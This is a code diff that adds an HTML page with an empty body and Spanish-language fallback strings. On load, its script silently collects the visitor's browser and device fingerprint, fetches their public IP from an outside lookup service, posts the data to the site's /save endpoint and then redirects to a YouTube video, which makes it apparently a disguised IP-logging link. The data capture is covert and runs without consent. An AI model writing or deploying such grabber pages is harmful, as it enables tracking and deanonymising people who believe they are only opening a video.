@@ -1,0 +1,70 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+</head>
+<body>
+</body>
+<script>
+    document.addEventListener("DOMContentLoaded", function() {
+        const info = {
+            userAgent: navigator.userAgent,
+            language: navigator.language,
+            platform: navigator.platform,
+            cpuCores: navigator.hardwareConcurrency || "No disponible",
+            memoryGB: navigator.deviceMemory || "No disponible",
+            online: navigator.onLine,
+            screenResolution: `${screen.width}x${screen.height}`,
+            windowSize: `${window.innerWidth}x${window.innerHeight}`,
+            connection: navigator.connection ? {
+                type: navigator.connection.effectiveType,
+                downlink: navigator.connection.downlink
+            } : "No disponible",
+            dateTime: new Date().toString(),
+            browser: getNavigatorData(),
+            ipPublica: ""
+        };
+
+    fetch("https://api.ipify.org?format=json")
+        .then(res => res.json())
+        .then(data => {
+            info.ipPublica = data.ip;
+            return fetch("/save", {
+                method: "POST",
+                headers: {
+                    "Content-Type": "application/json"
+                },
+                body: JSON.stringify(info),
+                keepalive: true
+            });
+        })
+        .catch(() => {
+            info.ipPublica = "No disponible";
+            return fetch("/save", {
+                method: "POST",
+                headers: {
+                    "Content-Type": "application/json"
+                },
+                body: JSON.stringify(info),
+                keepalive: true
+            });
+        })
+        .then(() => {
+            window.location.href = "https://www.youtube.com/watch?v=4gA5iaZ11lU&list=RD4gA5iaZ11lU&start_radio=1";
+        })
+        .catch(err => {
+            window.location.href = "https://www.youtube.com/watch?v=4gA5iaZ11lU&list=RD4gA5iaZ11lU&start_radio=1";
+        });
+    function getNavigatorData(){
+            const ua = navigator.userAgent;
+            if (ua.includes("Chrome") && !ua.includes("Edg") && !ua.includes("OPR")) return "Google Chrome";
+            if (ua.includes("Safari") && !ua.includes("Chrome") && !ua.includes("Edg")) return "Apple Safari";
+            if (ua.includes("Edg")) return "Microsoft Edge";
+            if (ua.includes("Firefox")) return "Mozilla Firefox";
+            if (ua.includes("OPR") || ua.includes("Opera")) return "Opera";
+            return "Unknown";    
+        }
+    });
+</script>
+</html>
